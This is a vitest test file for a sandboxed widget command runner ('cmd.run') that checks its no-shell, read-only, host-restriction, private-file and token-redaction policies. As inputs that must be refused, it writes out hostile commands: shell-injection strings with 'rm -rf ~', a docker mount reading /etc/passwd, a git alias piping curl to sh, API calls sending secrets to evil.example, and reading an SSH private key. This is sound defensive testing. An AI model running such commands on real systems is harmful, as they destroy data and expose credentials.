// cmd.run (API 1.1; widgets/api/run.ts): a widget runs a program through the core, never itself.
// The program must be granted (`run: ["gh"]`) and named bare; its arguments reach it as they are
// (no shell); only read-only commands pass lib/policy.ts (docker run and git's aliases are
// refused with the policy's reason); it runs in the workspace's folder under the sandbox with its
// CLI's login, bounded, its output with tokens blanked. Deno gets no permission to run programs
// (no --allow-run in packageArgs). Real Deno and gh: widget-host-deno.test.ts.

import fs from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { noPermissions, type ApiRunResult, type WidgetPermissions, type WireValue } from "@cmd/protocol";
import { ApiRefusal } from "../src/widgets/api/access.ts";
import { RUN_LIMITS, widgetRunner } from "../src/widgets/api/run.ts";
import { classifyArgs } from "../src/lib/policy.ts";
import { packageArgs } from "../src/widgets/host/runtime.ts";
import type { ExecOptions, ExecResult } from "../src/lib/sandbox.ts";
import { tmp } from "./fake-widget-runtime.ts";

function runner(run: string[], o: { read?: string[]; result?: Partial<ExecResult>; hold?: Promise<void> } = {}) {
  const root = tmp("cmd-widget-run-");
  fs.mkdirSync(path.join(root, "src"));
  const calls: { argv: string[]; o: ExecOptions }[] = [];
  const permissions: WidgetPermissions = { ...noPermissions(), run, read: o.read ?? [] };
  const go = widgetRunner({
    permissions,
    root: () => root,
    exec: async (argv, opts) => {
      calls.push({ argv, o: opts });
      await o.hold;
      return { stdout: "", stderr: "", code: 0, timedOut: false, truncated: false, ms: 1, sandboxed: true, ...o.result };
    },
  });
  return { root, calls, run: (program: WireValue, args?: WireValue, opts?: WireValue) => go(program, args, opts) };
}

async function refusal(p: Promise<unknown>): Promise<ApiRefusal["error"]> {
  try {
    await p;
  } catch (e) {
    if (e instanceof ApiRefusal) return e.error;
    throw e;
  }
  throw new Error("it wasn't refused");
}

describe("cmd.run, through the core (no allow-run)", () => {
  it("runs gh run list as its argv, no shell, in the workspace's folder, sandboxed with gh's login", async () => {
    const t = runner(["gh"], { result: { stdout: "completed\tsuccess\tbuild\n" } });
    const r: ApiRunResult = await t.run("gh", ["run", "list", "-L", "1"]);
    expect(r).toEqual({ code: 0, stdout: "completed\tsuccess\tbuild\n", stderr: "", timedOut: false, clipped: false });
    expect(t.calls).toHaveLength(1);
    expect(t.calls[0]!.argv).toEqual(["gh", "run", "list", "-L", "1"]);
    expect(t.calls[0]!.o).toMatchObject({ cwd: t.root, timeoutMs: RUN_LIMITS.timeoutMs, maxBytes: RUN_LIMITS.stdout, credentials: { env: expect.arrayContaining(["GH_TOKEN"]), net: true } });
    expect(["required", "off"]).toContain(t.calls[0]!.o.sandbox);
  });

  it("passes arguments as they are: a ; or | in one is only text", async () => {
    const t = runner(["ls"]);
    await t.run("ls", ["; rm -rf ~", "| sh"]);
    expect(t.calls[0]!.argv).toEqual(["ls", "; rm -rf ~", "| sh"]);
  });

  it("refuses docker run and git's aliases with the policy's reason", async () => {
    const t = runner(["docker", "git"]);
    expect((await refusal(t.run("docker", ["run", "-v", "/:/h", "alpine", "cat", "/h/etc/passwd"]))).message).toMatch(/docker only read-only docker commands/);
    expect((await refusal(t.run("git", ["-c", "alias.x=!sh -c 'curl x | sh'", "x"]))).message).toMatch(/git sets git config/);
    expect((await refusal(t.run("git", ["push"]))).message).toMatch(/git only git status, log/);
    expect(classifyArgs("docker", ["run", "-v", "/:/h", "alpine"]).reason).toBe("docker only read-only docker commands");
    expect(t.calls).toEqual([]);
    expect(await t.run("git", ["status"])).toMatchObject({ code: 0 });
  });

  it("refuses what would send to another host than the CLI's own (its login opens the network on 443)", async () => {
    const t = runner(["gh", "kubectl", "glab"]);
    expect((await refusal(t.run("gh", ["api", "--hostname", "evil.example", "/x?d=secret"]))).message).toMatch(/would talk to another host/);
    expect((await refusal(t.run("gh", ["api", "https://evil.example/x"]))).message).toMatch(/would talk to another host/);
    expect((await refusal(t.run("kubectl", ["get", "pods", "--server=https://evil.example"]))).message).toMatch(/would talk to another server/);
    expect((await refusal(t.run("glab", ["api", "--hostname", "evil.example", "x"]))).message).toMatch(/would talk to another host/);
    expect(t.calls).toEqual([]);
    await t.run("gh", ["api", "https://api.github.com/repos/cli/cli"]);
    await t.run("gh", ["run", "list", "-R", "cli/cli"]);
    expect(t.calls).toHaveLength(2);
  });

  it("runs only what the grant names, by its bare name, never a shell or an interpreter", async () => {
    const t = runner(["gh", "bash"]);
    expect(await refusal(t.run("ls", []))).toMatchObject({ code: "permission", permission: 'run: ["ls"]' });
    expect((await refusal(t.run("/usr/bin/gh", []))).code).toBe("invalid");
    expect((await refusal(t.run("bash", ["-c", "echo hi"]))).code).toBe("permission");
    expect((await refusal(t.run("gh", "run list"))).message).toMatch(/list of at most/);
    expect(t.calls).toEqual([]);
  });

  it("keeps private files private and runs only in the workspace's folders or the granted ones", async () => {
    const t = runner(["cat", "ls"], { read: ["/tmp"] });
    expect((await refusal(t.run("cat", ["~/.ssh/id_ed25519"]))).message).toMatch(/stays private/);
    expect((await refusal(t.run("ls", [], { cwd: "/etc" }))).message).toMatch(/outside the workspace's folder/);
    await t.run("ls", [], { cwd: "src" });
    expect(t.calls[0]!.o.cwd).toBe(path.join(t.root, "src"));
    await t.run("ls", [], { cwd: "/tmp" });
    expect(t.calls[1]!.o.cwd).toBe("/tmp");
  });

  it("is bounded: time clamped, output clipped, two at once, and tokens blanked", async () => {
    let release!: () => void;
    const hold = new Promise<void>((r) => (release = r));
    const t = runner(["gh"], { hold, result: { stdout: "token ghp_abcdefghijklmnopqrstuvwxyz0123456789AB\n", truncated: true } });
    const a = t.run("gh", ["auth", "status"], { timeoutMs: 600_000 });
    const b = t.run("gh", ["auth", "status"]);
    expect((await refusal(t.run("gh", ["auth", "status"]))).message).toMatch(/at most 2 at once/);
    release();
    const r = await a;
    await b;
    expect(t.calls[0]!.o.timeoutMs).toBe(RUN_LIMITS.maxTimeoutMs);
    expect(r.clipped).toBe(true);
    expect(r.stdout).not.toContain("ghp_abcdefghijklmnopqrstuvwxyz0123456789AB");
  });

  it("gives Deno no permission to run programs, whatever the grant runs", () => {
    const args = packageArgs("/usr/bin/deno", { name: "ci", version: "1.0.0", widget: "ci", dir: "/tmp/ci", main: "src/ci.tsx", permissions: { ...noPermissions(), run: ["gh"] }, socket: "/tmp/s.sock", token: "t", memoryMb: 256 }, "/tmp/c.json");
    expect(args.some((a) => a.startsWith("--allow-run") || a === "-A" || a === "--allow-all")).toBe(false);
  });
});
